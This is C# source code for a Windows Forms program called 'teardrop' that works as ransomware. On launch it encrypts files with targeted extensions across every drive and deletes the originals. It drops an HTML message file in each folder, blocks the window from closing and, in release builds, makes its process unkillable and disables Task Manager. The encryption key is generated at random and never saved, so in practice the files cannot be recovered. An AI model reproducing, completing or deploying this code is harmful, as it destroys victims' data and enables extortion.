using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text.Json;
using teardrop.Classes;
using static System.Runtime.InteropServices.JavaScript.JSType;

namespace teardrop
{
    public partial class FrmMain : Form
    {
        private readonly int _keySyze;
        private readonly int _saltSyze;
        private readonly int _iteractionsLimit;
        private readonly char[] _allowedChars;
        private readonly string[] _ignoredPaths;
        private readonly string[] _allowedExtensions;
        private readonly string _defaultExtension;
        private readonly string _defaultMessage;
        private readonly int ZERO = 0;

        private readonly CancellationTokenSource _cancellationTokenSource;
        private readonly IProgress<string> _notification;
        private readonly SemaphoreSlim _semaphore;
        private readonly CryptoManager _cryptoManager;

        private enum CypherMode
        {
            Encode,
            Decode
        }

        public FrmMain()
        {
            InitializeComponent();

            ResourceManager resourceManager = new(typeof(FrmMain));

            _ignoredPaths = JsonSerializer.Deserialize<string[]>(resourceManager.GetString("IGNORED_PATHS") ?? "") ?? [];
            _allowedChars = JsonSerializer.Deserialize<char[]>(resourceManager.GetString("CHARS") ?? "") ?? [];
            _allowedExtensions = JsonSerializer.Deserialize<string[]>(resourceManager.GetString("ALLOWED_EXTENSIONS") ?? "") ?? [];
            _defaultMessage = JsonSerializer.Deserialize<string>(resourceManager.GetString("DEFAULT_MESSAGE") ?? "") ?? "";
            _defaultExtension = JsonSerializer.Deserialize<string>(resourceManager.GetString("DEFAULT_EXTENSION") ?? "") ?? "";
            _iteractionsLimit = JsonSerializer.Deserialize<int>(resourceManager.GetString("ITERACTIONS_LIMIT") ?? "0");
            _saltSyze = JsonSerializer.Deserialize<int>(resourceManager.GetString("SALT_SIZE") ?? "0");
            _keySyze = JsonSerializer.Deserialize<int>(resourceManager.GetString("KEY_SIZE") ?? "0");

            _semaphore = new SemaphoreSlim(1, 10);

            _cancellationTokenSource = new CancellationTokenSource();

            _notification = new Progress<string>(WriteLine);

            _cryptoManager = new CryptoManager(_cancellationTokenSource.Token);

            GenereteApplicationID(64);

#if !DEBUG
            ProcessManager.ProcessUnkillable();
            MachineManager.DisableTaskManager();
#endif
        }

        private static byte[] GetSaltBytes(int KeySize)
        {
            byte[] saltBytes = new byte[KeySize];
            RandomNumberGenerator.Create().GetBytes(saltBytes);
            return saltBytes;
        }

        private static byte[] GetHashedPassword(string Password)
        {
            return GetHashBytes(GetKeyBytes(Password));
        }

        private void GenereteApplicationID(int length)
        {
            Text = GetRandomString(length);
        }

        private static byte[] GetHashBytes(byte[] passwordBytes)
        {
            return SHA256.HashData(passwordBytes);
        }

        private static byte[] GetKeyBytes(string password)
        {
            return System.Text.Encoding.Default.GetBytes(password);
        }

        public string GetRandomString(int length)
        {
            char[] randomChars = new char[length];

            Random random = new();

            for (int index = ZERO; index < length; index++)
            {
                randomChars[index] = _allowedChars[random.Next(_allowedChars.Length)];
            }

            return new string(randomChars);
        }

        public void WriteLine(string text)
        {
            txtBox.Text += $"[{DateTime.Now:yyyyy/MM/dd HH:mm:ss}]: {text}{Environment.NewLine}";
        }

        private async Task ChangeAllFilesAsync(string rootPath, CypherMode mode)
        {
            try
            {
                if ((File.GetAttributes(rootPath) & FileAttributes.ReparsePoint) is not FileAttributes.ReparsePoint)
                {
                    string newFilePath = string.Empty;

                    if (IgnoredPath(rootPath)) return;

                    foreach (string filePath in Directory.GetFiles(Path.GetFullPath(rootPath)))
                    {
                        string extension = Path.GetExtension(filePath);

                        switch (mode)
                        {
                            case CypherMode.Encode:

                                if (!IsValidExtension(extension)) break;

                                newFilePath = FileManager.AddExtension(filePath, _defaultExtension);

                                await _cryptoManager.EncodeFileAsync(filePath, newFilePath);

                                _notification.Report($@"Encrypted {filePath}");

                                RemoveFile(filePath);

                                _notification.Report($"Removed file {filePath}");

                                break;

                            case CypherMode.Decode:

                                if (!FileManager.HasExtension(filePath, _defaultExtension)) break;

                                newFilePath = FileManager.RemoveExtension(filePath, _defaultExtension);

                                await _cryptoManager.DecodeFileAsync(filePath, newFilePath);

                                _notification.Report($"Decrypted {filePath}");

                                RemoveFile(filePath);

                                _notification.Report($"Removed file {filePath}");

                                break;

                            default: throw new NotSupportedException();
                        }

                        foreach (string directory in GetDirectories(rootPath))
                        {
                            await ChangeAllFilesAsync(directory, mode);
                        }
                    }

                    CreateOrDeleteMessageFile(rootPath, mode);
                }
            }
            catch (Exception ex)
            {
                _notification.Report(ex.Message);
            }
        }

        private void CreateOrDeleteMessageFile(string path, CypherMode mode)
        {
            switch (mode)
            {
                case CypherMode.Encode:
                    FileManager.WriteHtmlFile(path, _defaultMessage);

                    _notification.Report($"Message file created {path}");
                    break;

                case CypherMode.Decode:
                    FileManager.RemoveHtmlFile(path);

                    _notification.Report($"Message file removed {path}");
                    break;

                default: throw new NotSupportedException();
            }
        }

        private bool IgnoredPath(string rootPath)
        {
            return _ignoredPaths.Contains(new DirectoryInfo(rootPath).Name);
        }

        private bool IsValidExtension(string extension)
        {
            return _allowedExtensions.Contains(extension.ToLower());
        }

        private static string[] GetDirectories(string path)
        {
            return Directory.GetDirectories(path);
        }

        private void RemoveFile(string filePath)
        {
            try
            {
                File.Delete(filePath);
            }
            catch (Exception ex)
            {
                WriteLine($"Cant delete file {ex.Message}");
            }
        }

        private async Task ManageDrivesAsync(CypherMode mode)
        {
            IList<Task> tasks = [];

            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                tasks.Add(TaskChangeDriveAsync(mode, drive));
            }

            await Task.WhenAll(tasks);
        }

        private Task TaskChangeDriveAsync(CypherMode mode, DriveInfo drive)
        {
            return Task.Run(async () =>
            {
                await _semaphore.WaitAsync();

                try
                {
                    await ChangeDriveAsync(drive, mode);
                }
                finally
                {
                    _semaphore.Release();
                }
            });
        }

        private async Task ChangeDriveAsync(DriveInfo drive, CypherMode mode)
        {
            _notification.Report($@"Found drive {drive.Name}");

            try
            {
                if (!drive.IsReady) throw new AccessViolationException("Drive is not ready.");

                await ChangeAllFilesAsync(drive.Name, mode);

                FileManager.WriteHtmlFile(drive.Name, _defaultMessage);

            }
            catch (Exception ex)
            {
                _notification.Report($@"Found drive {drive.Name}, but it's not ready. adicional info: {ex.Message}");
            }
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private async void BtnDecode_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtKey.Text.Trim())) return;

            _cryptoManager.DefineSettings(new(GetHashedPassword(txtKey.Text), new byte[_saltSyze], _iteractionsLimit));
#if DEBUG
            await ChangeAllFilesAsync("D:\\testDir", CypherMode.Decode);
#else
            await ManageDrivesAsync(CypherMode.Decode);
#endif
        }

        private async void FrmMain_Load(object sender, EventArgs e)
        {
            _cryptoManager.DefineSettings(new(GetHashedPassword(GetRandomString(_keySyze)), GetSaltBytes(_saltSyze), _iteractionsLimit));
#if DEBUG
            await ChangeAllFilesAsync("D:\\testDir", CypherMode.Encode);
#else
            await ManageDrivesAsync(CypherMode.Encode);
#endif
        }
    }
}